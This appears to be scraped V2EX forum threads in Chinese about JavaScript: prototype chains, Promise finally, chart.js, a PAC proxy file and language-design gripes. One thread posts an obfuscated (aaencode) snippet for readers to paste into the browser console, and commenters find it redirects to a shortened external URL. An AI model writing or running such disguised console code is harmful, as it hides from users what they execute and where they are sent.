class=\"c1\">//=&gt; false</span>\n\n<span class=\"nx\">o</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span> <span class=\"o\">===</span> <span class=\"nx\">Obj</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">;</span> <span class=\"c1\">//=&gt; true</span>\n<span class=\"nx\">o</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span> <span class=\"o\">===</span> <span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">;</span> <span class=\"c1\">//=&gt; true</span>\n<span class=\"nx\">o</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span> <span class=\"o\">===</span> <span class=\"nb\">Function</span><span class=\"p\">;</span>  <span class=\"c1\">//=&gt; false</span>\n</pre></div>\n\n<h2>参考</h2>\n\n<ol>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://pivotallabs.com/javascript-constructors-prototypes-and-the-new-keyword/\">JavaScript constructors, prototypes, and the <code>new</code> keyword</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.ruanyifeng.com/blog/2010/05/object-oriented_javascript_encapsulation.html\">Javascript 面向对象编程</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://book.douban.com/subject/7157249/\">Professional JavaScript for Web Developers</a></li>\n</ol>\n</div></div>"], "reply": "5", "tittle": "图解 Javascript 原型链", "comment": ["认真读了 一下子豁然开朗 感谢 @", " 分享～\r", "\r", "有一处疑问，为什么下例中p.prototype是undefine呢？\r", "var Person = function(){};\r", "Person.prototype.type = 'Person';\r", "Person.prototype.maxAge = 100;\r", "\r", "var p = new Person();\r", "console.log(p.maxAge);\r", "p.name = 'rainy';\r", "\r", "Person.prototype.constructor === Person;  //=> true\r", "p.__proto__ === Person.prototype;         //=> true\r", "console.log(p.prototype);                 //=> undefined  ???", " \r", "\r", "p is not a function.\r", "\r", "```js\r", "typeof p\r", "//=> 'object'\r", "```", "清楚明了\r", "感谢！", "有人能告诉我上面那种字符画的图是怎么做出来的吗？", " "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>ES6 原生的 Promise 只有then 和 catch 没有 finally，谁有靠谱的方式加上？</p>\n\n<p>已知的不太靠谱方法，有自己增加一个属性的方式finally，在里面调用 then 或者 catch 但这样只是一个then和catch的合体，并不是真的finally，它不会排在所有 then 所有 catch之后执行。</p>\n\n<p>例如 <br>\npromise = new Promise(...)<br>\npromise.finally().then() <br>\n这里后面的 then 会在 finally之后执行，<br>\n而真正的finally 应该在所有的 then 或者 catch 完结以后执行。<br>\n手工把finally写最后只是掩耳盗铃，<br>\n不能假设从此后这个promise不再增加其他的 then 或者catch</p>\n\n<p>比如 <br>\npromise.then().finally()<br>\n....</p>\n\n<p>if xxx:<br>\n    promise.then(...)</p>\n</div></div>"], "reply": "9", "tittle": "ES6 原生的 Promise 只有 then 和 catch 没有 finally，谁有靠谱的方式加上？", "comment": ["finally比较好加，按照现在社区的讨论，finally的特点如下：\r", "\r", "1. 不接收任何参数，原来的value或者Error在finally里是收不到的\r", "2. 处理后不影响原Promise的状态，该reject还是reject，该resolve还是resolve\r", "3. 不影响Promise向后传递的传，resolve状态还是传递原来的value，reject状态还是传递原来的Error\r", "\r", "所以代码这样就行了\r", "\r", "Promise.prototype.finally = function (callback) {\r", "    var Promise = this.constructor;\r", "    return this.then(\r", "        function (value) {\r", "            Promise.resolve(callback()).then(\r", "                function () {\r", "                    return value;\r", "                }\r", "            );\r", "        },\r", "        function (reason) {\r", "            Promise.resolve(callback()).then(\r", "                function () {\r", "                    throw reason;\r", "                }\r", "            );\r", "        }\r", "    );\r", "}", "代码自己拿去格式化吧，gist太麻烦", "另外你的“finally要在所有then和catch完成后执行”的说法是错的，仔细想想是不是“catch要在then后执行”呢？毕竟是先try后catch嘛\r", "\r", "Promise的then和catch是一种“衍生”，即会“生”出一个新的Promise来，相当于串行模式下从一个函数跳到了另一个函数，而之前的finally是“前一个函数中的finally”，所以并不是如你说的finally要在最后", "你给的这一段我在提问前自己也写过了。它虽然可以捕获 chain 之前的  then 或者 catch 然而并没有什么卵用，看下面这个链\r", "\r", "```coffee\r", "ajax(url)\r", ".then ->\r", "   go_uniqlo()\r", ".then ->\r", "   meet_girl()\r", ".catch ->\r", "   throw new Error('Impotence')\r", ".finally ->\r", "   fuck in the dressing room ...\r", "\r", "```\r", "\r", "那么这里的都需要代码写下之时手动写好，\r", "如果在后面动态加入\r", "\r", ".then ->\r", "  pick_up_cell_phone()\r", ".then ->\r", "  open_video_app()\r", "\r", "会排在finally 后面  丧失了 finally 的意义，这样的情况之前用 finally 只要用then 替代 就可以了\r", "而且相信 在现实使用中，极少极少会有 情况说是 在 链式调用 半路当中 需要 同时处理 成功和错误两种情况之后，还要继续 then 或者 catch 下去的。\r", "\r", "而我之前说的这种 链式调用 已经安排好以后 又由其他条件加入的情况 可以很常见。\r", "我在之前一个 angular material  的项目中平凡使用这种方式 在页面上显示 Toast （上传文件，全部传完，所有链式调用跑完，显示toast，中途添加文件，链数增加，finally 依旧在最后 显示 toast）\r", "\r", "因此，你理解的finally 和我说的 finally 不同。\r", "\r", "在这里我希望可以实现 angularjs 中 的 q deff 的 finally 效果。\r", "\r", "这个也其他的promise 实现中也有叫 complete 或者 done 的。\r", "\r", "它需要能够排在链式调用的最后一位，无条件执行。\r", "也相当于 switch 函数的  default\r", "\r", "对于这个问题，我现在基本上确定要么用其他的库，ES6 本身的 Promise 并没有这个，也许以后也不会有，在他们的 issues 中提过你提供的这一段代码，我觉得这个只是一个凑合的办法，而且它仅仅是方便了 链式调用，写死最后的那一下。", "这么实现会不会看着简单一些？\r", "\r", "  Promise.prototype.finally = function(fn) {\r", "    function finFn(valueORreason){\r", "      fn.call(null)\r", "    }\r", "    this.then(finFn, finFn)\r", "    return this\r", "  }", "调整了一下，这样可以保证finally一定最后执行，但是finally返回的是this而不是一个新的Promise\r", "如果想要返回一个新的Promise，this.then一下就好了", "我只是来看妹纸的。", " 好像行。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>chart.js类库可以帮助快速生成各种动态图形， 使用简单易用，以下代码可以生成相关饼图：</p>\n\n<p><img src=\"http://www.gbtags.com/gb/networks/uploadimgthumb/afb9a732-4f4b-4e2a-9a06-4e8786a280f8.jpg\" alt=\"\"></p>\n\n<p>var pieData = [<br>\n                {<br>\n                    value: 300,<br>\n                    color:\"#F7464A\",<br>\n                    highlight: \"#FF5A5E\",<br>\n                    label: \"Red\"<br>\n                },<br>\n                {<br>\n                    value: 50,<br>\n                    color: \"#46BFBD\",<br>\n                    highlight: \"#5AD3D1\",<br>\n                    label: \"Green\"<br>\n                },<br>\n                {<br>\n                    value: 100,<br>\n                    color: \"#FDB45C\",<br>\n                    highlight: \"#FFC870\",<br>\n                    label: \"Yellow\"<br>\n                },<br>\n                {<br>\n                    value: 40,<br>\n                    color: \"#949FB1\",<br>\n                    highlight: \"#A8B3C5\",<br>\n                    label: \"Grey\"<br>\n                },<br>\n                {<br>\n                    value: 120,<br>\n                    color: \"#4D5360\",<br>\n                    highlight: \"#616774\",<br>\n                    label: \"Dark Grey\"<br>\n                }</p>\n<div class=\"highlight\"><pre>];\n</pre></div>\n\n<p>window.onload = function(){<br>\n    var ctx = document.getElementById(\"chart-area\").getContext(\"2d\");<br>\n    window.myPie = new Chart(ctx).Pie(pieData);<br>\n};</p>\n\n<p>在线代码调试运行地址： <a target=\"_blank\" rel=\"nofollow\" href=\"http://dwz.cn/chartjs\">http://dwz.cn/chartjs</a></p>\n\n<p>扫扫二维码，手机上查看效果：</p>\n\n<p><img src=\"http://qrcoder.sinaapp.com/?t=http://www.gbtags.com/gb/rtreplayerpreview-standalone/1130.htm\" alt=\"\"></p>\n</div></div>"], "reply": "6", "tittle": "使用 chart.js 创建的动画效果饼图效果，支持手机哈~", "comment": ["话说百度的 echarts项目更好用", "前排安利 echarts", "百度的Echarts非常好用，前几天才用过，特别爽\r", "都没听说过d3js？", "强迫症表示浅灰色角探出去的那个尖儿让人担忧……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>以下是一个PAC文件，一个基本的白名单，可以通过添加域名扩展，我不是很懂Javascript，就一些代码的意思做了google，只是理解了其中一部分比如： <code>if (/^\\d+\\.\\d+\\.\\d+\\.\\d+$/g.test(host)) return 'DIRECT';</code>  用到了正则表达式，如果碰到纯ip的请求，就直连。<br>\n但是从 <code>var vhost = host.toLowerCase();</code> 这一行开始我就懵了，有没有熟悉的能用白话文解释一下吗？多谢。</p>\n<div class=\"highlight\"><pre><span class=\"kd\">function</span> <span class=\"nx\">FindProxyForURL</span><span class=\"p\">(</span><span class=\"nx\">url</span><span class=\"p\">,</span> <span class=\"nx\">host</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">PROXY</span> <span class=\"o\">=</span> <span class=\"s1\">'SOCKS5 127.0.0.1:9999;SOCKS 127.0.0.1:9999'</span><span class=\"p\">;</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">isPlainHostName</span><span class=\"p\">(</span><span class=\"nx\">host</span><span class=\"p\">))</span> <span class=\"k\">return</span> <span class=\"s1\">'DIRECT'</span><span class=\"p\">;</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"sr\">/^\\d+\\.\\d+\\.\\d+\\.\\d+$/g</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">(</span><span class=\"nx\">host</span><span class=\"p\">))</span> <span class=\"k\">return</span> <span class=\"s1\">'DIRECT'</span><span class=\"p\">;</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">rules</span> <span class=\"o\">=</span> <span class=\"p\">[</span>\n        <span class=\"p\">[</span>\n            <span class=\"s1\">'cn'</span><span class=\"p\">,</span>\n            <span class=\"s1\">'lan'</span><span class=\"p\">,</span>\n            <span class=\"s1\">'local'</span><span class=\"p\">,</span>\n            <span class=\"s1\">'xn--fiqs8s'</span>\n        <span class=\"p\">],</span> <span class=\"p\">[</span>\n            <span class=\"s1\">'sinaapp.com'</span><span class=\"p\">,</span>\n            <span class=\"s1\">'qunar.com'</span><span class=\"p\">,</span>\n            <span class=\"s1\">'yihaodian.com'</span><span class=\"p\">,</span>\n        <span class=\"p\">],</span> <span class=\"p\">[</span>\n            <span class=\"s1\">'baixing.com'</span><span class=\"p\">,</span>\n            <span class=\"s1\">'xiami.com'</span><span class=\"p\">,</span>\n        <span class=\"p\">],</span> <span class=\"p\">[</span>\n            <span class=\"s1\">'mydrivers.com'</span><span class=\"p\">,</span>\n            <span class=\"s1\">'alisoft.com'</span><span class=\"p\">,</span>\n            <span class=\"s1\">'51jobcdn.com'</span>\n        <span class=\"p\">],</span> <span class=\"p\">[</span>\n            <span class=\"s1\">'zhi.hu'</span><span class=\"p\">,</span>\n        <span class=\"p\">]</span>\n    <span class=\"p\">];</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">vhost</span> <span class=\"o\">=</span> <span class=\"nx\">host</span><span class=\"p\">.</span><span class=\"nx\">toLowerCase</span><span class=\"p\">();</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">rules_len</span> <span class=\"o\">=</span> <span class=\"nx\">rules</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span>\n    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">j</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">j</span> <span class=\"o\">&lt;</span> <span class=\"nx\">rules_len</span><span class=\"p\">;</span> <span class=\"nx\">j</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">rule_list</span> <span class=\"o\">=</span> <span class=\"nx\">rules</span><span class=\"p\">[</span><span class=\"nx\">j</span><span class=\"p\">];</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">rule_list_len</span> <span class=\"o\">=</span> <span class=\"nx\">rule_list</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span>\n        <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"nx\">rule_list_len</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"kd\">var</span> <span class=\"nx\">rule_entry</span> <span class=\"o\">=</span> <span class=\"nx\">rule_list</span><span class=\"p\">[</span><span class=\"nx\">i</span><span class=\"p\">];</span>\n            <span class=\"kd\">var</span> <span class=\"nx\">rule_dot</span> <span class=\"o\">=</span> <span class=\"s1\">'.'</span> <span class=\"o\">+</span> <span class=\"nx\">rule_entry</span><span class=\"p\">;</span>\n            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">vhost</span> <span class=\"o\">===</span> <span class=\"nx\">rule_entry</span> <span class=\"o\">||</span> <span class=\"nx\">vhost</span><span class=\"p\">.</span><span class=\"nx\">indexOf</span><span class=\"p\">(</span><span class=\"nx\">rule_dot</span><span class=\"p\">,</span> <span class=\"nx\">vhost</span><span class=\"p\">.</span><span class=\"nx\">length</span> <span class=\"o\">-</span> <span class=\"nx\">rule_dot</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">)</span> <span class=\"o\">!==</span> <span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                <span class=\"k\">return</span> <span class=\"s1\">'DIRECT'</span><span class=\"p\">;</span>\n            <span class=\"p\">}</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">return</span> <span class=\"nx\">PROXY</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</pre></div>\n</div></div>", "<div class=\"topic_content\">不纠结了， 把gfwlist2pac搞成白名单了，https://www.v2ex.com/t/208369#reply0</div>"], "reply": "16", "tittle": "javascript PAC 代码分析理解", "comment": ["先小写啊，然后两次循环那个二维数组，如果域名和数组里的值相等或者能匹配到就直接连啊", " 那个rules 可以写成这样吗？\r", "\r", "``` javascript\r", "\r", "var rules = [\r", "            'cn',\r", "            'lan',\r", "            'local',\r", "            'xn--fiqs8s'\r", "            '", "',\r", "            '", "',\r", "            '", "',\r", "            '", "',\r", "            '", "',\r", "            '", "',\r", "            '", "',\r", "            '", "'\r", "            'zhi.hu',\r", "    ];\r", "\r", "```", " 回复不能用mardown？\r", "\r", "var rules = [ \r", "'cn', \r", "'lan', \r", "'local', \r", "'xn--fiqs8s' \r", "'", "', \r", "'", "', \r", "'", "', \r", "'", "', \r", "'", "', \r", "'", "', \r", "'", "', \r", "'", "' \r", "'zhi.hu', \r", "];", " 为什么要两次循环呢？什么叫做二维数组？", " 可以，不过相应的循环要改", " 这是算法问题，建议从C语言学起…", " 我不懂任何语言。。。哦，不对，懂一点shell。 您觉得这个pac有没有可以改进的地方以提高性能？", " 参考 ", " 例子有两种写法。fast 应该和你需要的类似", " gfwlist2pac 是黑名单模式，不知道怎么改成白名单。", "pac是有格式规定的，可参考\r", "\r", "//================= Config Start ======================\r", "\r", "// proxy config\r", "var rules = [];\r", "var direct = 'DIRECT';\r", "var defalut = direct;\r", "\r", "// SSLEdge Proxy\r", "rules.push({\r", "  proxy: 'PROXY 127.0.0.1:8119',\r", "  list: [\r", "    //google\r", "    '", "',\r", "    'google.co.jp',\r", "    '", "',\r", "    '", "',\r", "    '", "',\r", "    '", "',\r", "    'goo.gl',\r", "    '", "',\r", "\r", "    //youtube\r", "    '", "',\r", "    '", "',\r", "    '", "',\r", "\r", "    //facebook\r", "    '", "',\r", "    '", "',\r", "    '", "',\r", "\r", "    //wikipedia.org\r", "    '", "',\r", "\r", "    // porn\r", "    '", "',\r", "\r", "    // onedrive\r", "    '", "',\r", "    '", "',\r", "    '", "',\r", "\r", "    // github\r", "    '", "',\r", "\r", "    // disqus\r", "    '", "',\r", "\r", "    // wordpress\r", "    'w.org',\r", "\r", "    '", "',\r", "    '", "',\r", "  ]\r", "});\r", "\r", "//================= Config End ======================\r", "\r", "// cache white list into a hash\r", "var _rules = {};\r", "rules.forEach(function(rule){\r", "    var list = rule.list;\r", "    var length = list.length;\r", "    var proxy = rule.proxy;\r", "    for (var i = 0; i < length; i++){\r", "      _rules[list[i]] = proxy;\r", "    }\r", "});\r", "\r", "// get the root domain from a url\r", "var reg = /https?:\\/\\/[^\\/]*?(\\w+\\.\\w+)\\/.*/i;\r", "var getRootDomain = function getRootDomain(url){\r", "  return url.match(reg)[1];\r", "};\r", "\r", "// interface for PAC\r", "var FindProxyForURL = function FindProxyForURL(url, host) {\r", "  return _rules[getRootDomain(url)] || defalut;\r", "};\r", "\r", "\r", "我手写的", "浏览器打开了以后pac只跑一遍的。所以第一次跑的效率无所谓，FindProxyForURL接口的效率才比较重要。", " 你这个也是黑名单吧。。。我想做白名单，因为现在被x的网站每天都在增长。", " \r", "\r", "很简单啊，rules那里不是有配置代理的吗？\r", "\r", "直接把 dafault 换成地理地址，把rules那里的代理换成direct就成白名单了呀", " \r", "\r", "// proxy config\r", "var rules = [];\r", "var direct = 'DIRECT';\r", "\r", "// => 这里把defalut改成代理\r", "var defalut = 'PROXY 127.0.0.1:8119';\r", "\r", "// SSLEdge Proxy\r", "rules.push({\r", "\r", "// => 这里把配置改成direct\r", "proxy: direct,\r", "\r", "list: [\r", "//google\r", "'", "', \r", ".......", " (我觉得)这个不应叫格式，应该叫接口约定吧。"]},
{"content": ["<div class=\"topic_content\">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');\r<br>\r<br>F12 丢到 JavaScript 控制台</div>"], "reply": "21", "tittle": "这段代码是如何实现的", "comment": ["undefined?", " 并不是，效果是执行了 window.open", "utf-8jp 编码", "看起来挺有意思", "好逗。不过很好奇是如何转化成符号的", " 看到了，console里是undefined，不过的确开了一个网页", "这么吊", "好像就是转码……\r", "\r", "囧……如何贴gist...", "好吧最后一发试完不试了\r", "然而并没有卵用，Chrome 的 VMXXXX 看到都是明文\r", "(function() {\r", "location='//t.cn/RZinuFT'\r", "})\r", "怎么说呢，这这 eval or 函数包装类的混淆，真的鸟用没有", "这背景音乐，吓尿啊", "最近被迫硬上JS，没想到还有这种玩法……\r", "ﾟωﾟﾉ = 1;\r", "ﾟωﾟﾉ  + ﾟωﾟﾉ  == 2;", "应该是类似于 ", " 哈哈，很有意思。：)", "alert((!(~+[])+{})[--[~+\"\"][+[]]*[~+[]] + ~~!+[]]+({}+[])[[~!+[]]*~+[]]);", "好有趣。", "厉害"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如obj的key只能是str....我想做个以对象为key的map还要自己调用hash<br>\n比如for(i in array)返回的是key的列表，喂，你是把自己当map了吗....for(i of array)才等同于Python里的for i in array...说实话以我的弱渣英语真不懂这里in和of都有啥能让人记住的区别<br>\n比如split()居然返回的是自己...靠..你默认\\n或者空格都行啊..返回自己是个什么设计...</p>\n</div></div>", "<div class=\"topic_content\">我本来发这个帖子，除了想吐槽外（不是黑），主要想看看我的第一个需求，写js的人会用什么优雅的方式解...可惜一半的人上来先说，这是js的特色啊/黑得不在点子上...嗯</div>"], "reply": "39", "tittle": "有的时候真的不知道 js 这些东西是怎么被设计成这样的....", "comment": ["如果js/perl/bash的设计者在同一架飞机上,那我一定会不惜一切代价把他炸了.", "这……貌似喷都没喷到点上唉……", " \r", "\r", "然而prel风格的正则大法好，正则是处理字符串的利器。\r", "然而bash光一个pipe+重定向就秒天秒地了。\r", "然而js……嗯，js大法好！ /w\\", "前端的东西比这乱的多了去了，说明还是见得少。\r", "这都受不了的话，去试试世界上最好的语言，提升一下免疫力。", "我就静静地看着你装逼。", " 最近在看看为什么node这么火爆。所以也不算在接触前端吧。前段时间工作需要看别人写的Perl代码，除了觉得奇怪的字符比较多以及奇怪的scalar以外，感觉也还好。。。\r", " 没有啦。我并没有在喷。只是学习中吐槽一下。而且我也是新手，肯定喷不到点上。", " Perl 其实很有 consistency，只要你学会用 Larry Wall 的脑回路思考，设计风格是很一致的。相比之下 PHP 就是设计者拍拍屁股就加个特性的表率。", "吐槽的点都好怪，而且你都用es6的for of 了为何不用es6的map？有in了还来个of很自然就能知道是不能破坏以前in的语意呗……\r", "\r", "学语言都要了解一下特定语言的一些怪癖，Js有这些其他语言何尝没有……", "顺便es从5开始设计就很不错了，大多数坑都是在最初版埋下的为了兼容没办法改（比如 typeof null是object），不过由于第一版js很简单其实这些坑也不多的。", " 恩，其实我就是在学这些怪癖，但是这些怪癖我真是怪的想吼出来了....", "console.log(Function instanceof Object); // true   \r", "    console.log(Object instanceof Function);  //true\r", "    console.log(Object instanceof Object);   //true\r", "    console.log(Function instanceof Function); //true", "太年轻。。我们切图仔写两行JS容易么。。。", "console.log(Function === Function.constructor );  //true\r", " console.log(Object === Object.constructor );  //false\r", " 终于出现了一个false", "console.log(Object.constructor);                   // [Function: Function]\r", "console.log(Object.constructor.__proto__);  //[Function: Empty]", "console.log({} === {});   //false", " 我真的觉得你们挺不容易的....在es6前，你们是怎么忍受少了这么多功能的...上面那个哥们说的各种true false也懒的去说了...", " 我比较能接受保留in原来的for(key in array)，加入for(key,value in array)...", "用到了就习惯了，想当初第一节编程课上老师都说过，语言都是相通的，只是语法不一样，一种语言能实现的东西，其他语言肯定能实现。还有，我刚刚在segmentfault回答你的问题了。。。换了个地方又见到了你。", "一直不明白别人喷js的原因是什么，你们觉得和你们之前学的不一样的地方正是js的特点，我喜欢", " 把js黑到极点了，笑cry", " 黑js的简直都快成一个产业了。比如还有这个： ", "我还以为是什么呢 黑都没黑到点子上 当初js设计是用来于DOM交互的,说白了 就是用来操作HTML页面的,根本没考虑过现在居然还能用来写后端.", " 原因是不爽，至于为什么不爽，就好像你学物理的时候感觉数学上的一些知识直接拿来用是可以的，但是学语文的时候数学的知识突然全没用了...", " 原来黑还要黑到点子上。不爽还要不爽到别人也不爽的地方？或者你觉得我说的这些其实挺爽的？ 这位同学活着有点累吧。", "JS 符合摩尔定律，每过一段时间复杂性翻倍。", " 你问第一个有什么解答我说了es6的map了。\r", "我想说的是语言都有其特色，你不能学了其他语言再用C的时候抱怨C没有gc没有map甚至连链表都没有吧？要用什么东西就用那个东西的特色，单纯抱怨真的很没意思。\r", "没有的东西自己创造就行了，都是程序员不是吗？", " 恩。我说了是一大半人。另外，我之所以不会吐槽C没有map，是因为C真的没有map。而js有一个map<srting,Any>..也就是一个本来应该是泛型的东西弄了个偏特化出来了..这真的让我觉得有点接受不能，都已经帮忙实现了map了，为什么还要加上这个限制呢(我觉得是限制，而不是功能子集，也就是说实现一个泛型的和实现已经有的这个，代码没啥大区别，但是偏偏就是限制了只能用string）", "我觉得你只是在吐槽js不符合你的python习惯\r", "说实话，一个牛逼的JSer可能也对你提出这俩问题反过来吐槽python是谁设计的", " 当你说范型偏特化的时候，已经是在以c++的角度来看待JS了。那是不是我用了es6的map之后，就可以抱怨C++ 